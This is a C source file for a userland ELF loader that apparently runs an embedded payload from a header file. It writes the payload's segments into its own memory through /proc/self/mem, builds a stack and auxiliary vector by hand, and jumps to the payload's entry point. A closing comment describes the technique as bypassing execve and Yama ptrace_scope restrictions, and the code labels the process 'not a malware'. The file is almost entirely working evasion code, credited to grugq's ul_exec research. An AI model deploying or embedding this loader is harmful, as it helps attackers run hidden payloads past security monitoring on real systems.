#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <ctype.h>
#include <elf.h>
#include <sys/mman.h>

#include "elf-payload.h"

ssize_t write_in_mem(long addr, pid_t pid, unsigned char *buffer, size_t len) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);

    int fd = open(path, O_RDWR);
    if (fd < 0) return -1;

    if (lseek(fd, (off_t)addr, SEEK_SET) == (off_t)-1) {
        close(fd);
        return -2;
    }

    ssize_t ret = write(fd, buffer, len);

    close(fd);
    return ret;
}

void calculate_memory_bounds(Elf64_Ehdr *ehdr, uintptr_t *min_vaddr, uintptr_t *max_vaddr) {
    *min_vaddr = ~(uintptr_t)0; 
    *max_vaddr = 0;
    
    Elf64_Phdr *phdr = (Elf64_Phdr *)((uintptr_t)ehdr + ehdr->e_phoff);

    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_LOAD) {
            if (phdr[i].p_vaddr < *min_vaddr) {
                *min_vaddr = phdr[i].p_vaddr;
            }
            
            uintptr_t segment_end = phdr[i].p_vaddr + phdr[i].p_memsz;
            if (segment_end > *max_vaddr) {
                *max_vaddr = segment_end;
            }
        }
    }
}

void* allocate_exec_mem(Elf64_Ehdr *ehdr, uintptr_t min_vaddr, size_t total_memory_size) {
    if (ehdr->e_type == ET_EXEC) {
        return mmap((void *)min_vaddr, total_memory_size, PROT_NONE, 
                    MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
    } else {
        return mmap(NULL, total_memory_size, PROT_NONE, 
                    MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    }
}

// load segments from physical to virtual mem, fill with zeros the .bss segment
int load_segments_procfs(Elf64_Ehdr *ehdr, const unsigned char *elf, void *exec_mem, uintptr_t min_vaddr, pid_t pid) {
    Elf64_Phdr *phdr = (Elf64_Phdr *)((uintptr_t)elf + ehdr->e_phoff);

    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_LOAD) {
            if (phdr[i].p_filesz > phdr[i].p_memsz) return -1;

            // Calcola i permessi specifici per questo segmento
            int prot = 0;
            if (phdr[i].p_flags & PF_R) prot |= PROT_READ;
            if (phdr[i].p_flags & PF_W) prot |= PROT_WRITE;
            if (phdr[i].p_flags & PF_X) prot |= PROT_EXEC;

            uintptr_t dest_addr = (uintptr_t)exec_mem + (phdr[i].p_vaddr - min_vaddr);
            
            // Allinea gli indirizzi alla dimensione della pagina per mmap
            uintptr_t aligned_start = dest_addr & ~((uintptr_t)sysconf(_SC_PAGESIZE) - 1);
            uintptr_t align_diff = dest_addr - aligned_start;
            size_t map_len = phdr[i].p_memsz + align_diff;

            // Mappa l'area specifica sovrascrivendo il PROT_NONE con i permessi finali
            void *mapped = mmap((void *)aligned_start, map_len, prot, 
                                MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (mapped == MAP_FAILED) return -1;

            // Scrittura dei dati presenti nel file ELF usando procfs
            unsigned char *src = (unsigned char *)((uintptr_t)elf + phdr[i].p_offset);
            if (phdr[i].p_filesz > 0) {
                if (write_in_mem(dest_addr, pid, src, phdr[i].p_filesz) != (ssize_t)phdr[i].p_filesz) return -1;
            }

            // Scrittura della sezione .bss (padding con zeri)
            if (phdr[i].p_memsz > phdr[i].p_filesz) {
                size_t zero_bytes = phdr[i].p_memsz - phdr[i].p_filesz;
                uintptr_t bss_start = dest_addr + phdr[i].p_filesz;
                
                unsigned char *zero_buffer = calloc(1, zero_bytes);
                if (!zero_buffer) return -1;
                
                int ret = write_in_mem(bss_start, pid, zero_buffer, zero_bytes);
                free(zero_buffer);
                if (ret != (ssize_t)zero_bytes) return -1;
            }
        }
    }
    return 0;
}

// prepare Stack Pointer and auxiliar vector
uintptr_t* prepare_stack(Elf64_Ehdr *ehdr, void *exec_mem) {
    size_t stack_size = 1024 * 1024;
    void *real_stack = mmap(NULL, stack_size, PROT_READ | PROT_WRITE, 
                            MAP_ANONYMOUS | MAP_PRIVATE | MAP_GROWSDOWN, -1, 0);

    if (real_stack == MAP_FAILED) return NULL;

    uintptr_t *stack_top = (uintptr_t *)((uintptr_t)real_stack + stack_size);
    uintptr_t *sp = stack_top - 64; 

    int s_idx = 0;
    
    // argc, argv, envp
    sp[s_idx++] = 1;                                 // argc: 1 the program name
    sp[s_idx++] = (uintptr_t)"not a malware";        // program name
    sp[s_idx++] = 0;                                 // argv: NULL pointer
    sp[s_idx++] = 0;                                 // envp: NULL pointer

    // auxv
    sp[s_idx++] = 3;                                        // AT_PHDR (3): the headers are in the RAM
    sp[s_idx++] = (uintptr_t)exec_mem + ehdr->e_phoff;      // pointer to headers in RAM

    sp[s_idx++] = 4;                                        // AT_PHENT (4): size of headers
    sp[s_idx++] = ehdr->e_phentsize;                        // size

    sp[s_idx++] = 5;                                        // AT_PHNUM (ID 5): how many headers are there:
    sp[s_idx++] = ehdr->e_phnum;                            // number of headers

    sp[s_idx++] = 6;                                        // AT_PAGESZ (ID 6): size of memory page
    sp[s_idx++] = (uintptr_t) sysconf(_SC_PAGESIZE);        // size

    sp[s_idx++] = 25;                                       // AT_RANDOM (ID 25): random bytes to be used for the stack canary
    sp[s_idx++] = (uintptr_t)exec_mem;                      // some available bites are these ones
    
    sp[s_idx++] = 0;                                        // AT_NULL (ID 0): [0, 0]
    sp[s_idx++] = 0;                                        // end of the vector

    return sp;
}

uintptr_t get_entrypoint(Elf64_Ehdr *ehdr, void *exec_mem, uintptr_t min_vaddr) {
    if (ehdr->e_type == ET_DYN) {
        return (uintptr_t)exec_mem + (ehdr->e_entry - min_vaddr);
    } else {
        return ehdr->e_entry; 
    }
}

void jump_to_entry(uintptr_t *sp, uintptr_t entry_point) {
    __asm__ volatile (
        "mov %0, %%rsp\n\t"
        "jmp *%1\n\t"
        :
        : "r" (sp), "r" (entry_point) 
        : "memory"
    );
}


int main() {
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *) elf;

    uintptr_t min_vaddr, max_vaddr;
    calculate_memory_bounds(ehdr, &min_vaddr, &max_vaddr);
    size_t total_memory_size = max_vaddr - min_vaddr;
    printf("[+] Memory bounds: 0x%lx - 0x%lx (size: %zu)\n", min_vaddr, max_vaddr, total_memory_size);

    void *exec_mem = allocate_exec_mem(ehdr, min_vaddr, total_memory_size);
    if (exec_mem == MAP_FAILED) {
        fprintf(stderr, "[-] Failed to allocate executable memory\n");
        exit(1);
    }
    printf("[+] Executable memory allocated at: %p\n", exec_mem);

    pid_t current_pid = getpid();
    if (load_segments_procfs(ehdr, elf, exec_mem, min_vaddr, current_pid) != 0) {
        fprintf(stderr, "[-] Failed to load ELF segments\n");
        exit(1);
    }
    printf("[+] ELF segments loaded successfully\n");

    uintptr_t *sp = prepare_stack(ehdr, exec_mem);
    if (sp == NULL) {
        fprintf(stderr, "[-] Failed to prepare stack\n");
        exit(1);
    }
    printf("[+] Stack prepared at: %p\n", (void *)sp);

    uintptr_t entry_point = get_entrypoint(ehdr, exec_mem, min_vaddr);
    printf("[+] Entry point: 0x%lx\n", entry_point);
    printf("[+] Jumping to entry point...\n");

    printf("[+] Injection finished\n");
    fflush(stdout);
    jump_to_entry(sp, entry_point);

    exit(0);
}

/** 
 * This technique performs a User-Space ELF Loading (Self-Injection),
 * bypassing execve and Yama ptrace_scope restrictions.
 * It avoids the need for mprotect by writing PT_LOAD segments directly into executable memory through the /proc/self/mem interface.
 * By manually constructing the stack frame (argc, argv) and Auxiliary Vector (auxv),
 * it achieves a full execution context switch via a direct jump to the entry point,
 * running the payload entirely within the existing process's address space.
 * 
 * It works also with /proc/sys/kernel/yama/ptrace_scope setted to 2 (maybe also 3)
 * because these restrictions works for inter-process inj (not intra like this one)
 * 
 * [!]: the only syscalls used are a bunch of mmap (2 + 1 for every section in the elf)
 * 
 * Injection inspired by grugq in
 * https://grugq.github.io/docs/ul_exec.txt
 */